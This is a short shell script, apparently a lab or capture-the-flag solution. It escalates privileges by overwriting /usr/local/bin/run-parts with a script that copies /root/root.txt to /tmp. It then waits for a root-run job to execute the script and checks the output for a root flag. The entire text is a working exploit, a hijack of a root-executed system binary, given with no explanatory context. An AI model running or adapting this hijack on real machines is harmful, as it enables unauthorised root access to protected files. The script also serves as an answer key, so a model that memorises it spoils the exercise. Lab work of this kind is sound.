set -eu
cat > /usr/local/bin/run-parts <<'EOF'
#!/bin/sh
cat /root/root.txt > /tmp/runparts-root
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/runparts-root ] && break
    sleep 1
done
out=$(cat /tmp/runparts-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "run-parts hijack failed" >&2; exit 1; }
